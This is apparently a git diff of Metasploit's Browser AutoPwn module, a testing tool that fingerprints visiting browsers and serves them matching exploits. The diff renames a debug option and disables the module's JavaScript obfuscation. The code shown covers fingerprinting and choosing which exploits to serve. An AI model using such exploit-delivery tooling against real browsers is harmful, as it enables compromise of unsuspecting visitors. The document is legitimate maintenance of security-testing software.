@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
       OptRegexp.new('EXCLUDE', [false,
         'Only attempt to use exploits whose name DOES NOT match this regex'
       ]),
-      OptBool.new('DEBUG', [false,
+      OptBool.new('DEBUG_AUTOPWN', [false,
         'Do not obfuscate the javascript and print various bits of useful info to the browser',
         false
       ]),
@@ -225,20 +225,25 @@ class Metasploit3 < Msf::Auxiliary
       }
 
       function bodyOnLoad() {
-        var detected_version = window.os_detect.getVersion();
+        var detected_version = os_detect.getVersion();
         //#{js_debug('detected_version')}
         report_and_get_exploits(detected_version);
       } // function bodyOnLoad
     ENDJS
     )
 
-    if (datastore['DEBUG'])
-      print_debug("NOTE: Debug Mode; javascript will not be obfuscated")
+    if (datastore['DEBUG_AUTOPWN'])
+      print_status("NOTE: Debug Mode; javascript will not be obfuscated")
     else
       pre = Time.now
-      print_status("Obfuscating initial javascript #{pre}")
-      @init_js.obfuscate
-      print_status "Done in #{Time.now - pre} seconds"
+
+      #
+      # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn
+      #
+
+      #print_status("Obfuscating initial javascript #{pre}")
+      #@init_js.obfuscate
+      #print_status "Done in #{Time.now - pre} seconds"
     end
 
     #@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
@@ -344,7 +349,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # For testing, set the exploit uri to the name of the exploit so it's
     # easy to tell what is happening from the browser.
-    if (datastore['DEBUG'])
+    if (datastore['DEBUG_AUTOPWN'])
       @exploits[name].datastore['URIPATH'] = name
     else
       # randomize it manually since if a saved value exists in the user's
@@ -826,8 +831,12 @@ class Metasploit3 < Msf::Auxiliary
     js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
     js << "window.next_exploit(0);\n"
 
-    js = ::Rex::Exploitation::JSObfu.new(js)
-    js.obfuscate unless datastore["DEBUG"]
+    #
+    # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn
+    #
+
+    #js = ::Rex::Exploitation::JSObfu.new(js)
+    #js.obfuscate unless datastore["DEBUG_AUTOPWN"]
 
     response.body = "#{js}"
     print_status("Responding with #{sploit_cnt} exploits")
@@ -851,7 +860,7 @@ class Metasploit3 < Msf::Auxiliary
       return !! client_str.match(module_spec)
     when ::Array
       return !! exploit_spec.map{ |spec|
-        client_matches_module_spec?(client_str, spec) 
+        client_matches_module_spec?(client_str, spec)
       }.include?(true)
     end
 
@@ -935,7 +944,6 @@ class Metasploit3 < Msf::Auxiliary
         detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
         print_status("JavaScript Report: #{detected_version}")
 
-    
         (os_name, os_vendor, os_flavor, os_device, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
 
         if framework.db.active
@@ -947,7 +955,7 @@ class Metasploit3 < Msf::Auxiliary
           note_data['os.version']   = os_sp     if os_sp != 'undefined'
           note_data['os.language']  = os_lang   if os_lang != 'undefined'
           note_data['os.arch']      = arch      if arch != 'undefined'
-          note_data['os.certainty'] = '0.7' 
+          note_data['os.certainty'] = '0.7'
           print_status("Reporting: #{note_data.inspect}")
 
           # Reporting stuff isn't really essential since we store all
@@ -1048,7 +1056,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def js_debug(msg)
-    if datastore['DEBUG']
+    if datastore['DEBUG_AUTOPWN']
       return "document.body.innerHTML += #{msg};"
     end
     return ""
